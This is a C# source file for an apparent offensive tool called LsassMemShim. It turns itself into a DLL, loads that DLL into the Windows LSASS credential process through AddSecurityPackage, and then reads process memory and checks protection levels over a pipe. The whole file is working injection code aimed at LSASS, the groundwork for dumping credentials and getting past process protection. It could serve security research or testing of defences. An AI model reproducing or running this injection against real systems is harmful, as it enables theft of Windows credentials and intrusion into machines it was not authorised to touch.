using System;

namespace LsassMemShim
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (!Pipe.LsassModuleLoaded())
            {
                Exporter.Export();
                Console.WriteLine("inject : " + System.Reflection.Assembly.GetExecutingAssembly().Location.Replace(".exe", ".dll"));
                var res = LSASSP.AddSecurityPackage(System.Reflection.Assembly.GetExecutingAssembly().Location.Replace(".exe", ".dll"), new LSASSP.SECURITY_PACKAGE_OPTIONS());
                Console.WriteLine("AddSecurityPackage: " + res.ToString("X"));
                Console.WriteLine("Current process protection level : " + PPL.GetProcessProtectionLevel());
            }
            Console.WriteLine("OpenProcess");
            Pipe.OpenProcess("LsassMemShim", out UInt64 baseAddr);
            Console.WriteLine("ReadProcessMemory, BaseAddress : " + baseAddr.ToString("X"));
            var exeHeader = BitConverter.ToUInt64(Pipe.ReadProcessMemory(baseAddr, 8), 0);
            Console.WriteLine(baseAddr.ToString("X") + " : " + exeHeader.ToString("X"));
            Console.WriteLine("LSASS process protection level : " + Pipe.GetProcessProtectionLevel());
            Pipe.Close();
            Console.WriteLine("fin");
            Console.Read();
        }
    }
}
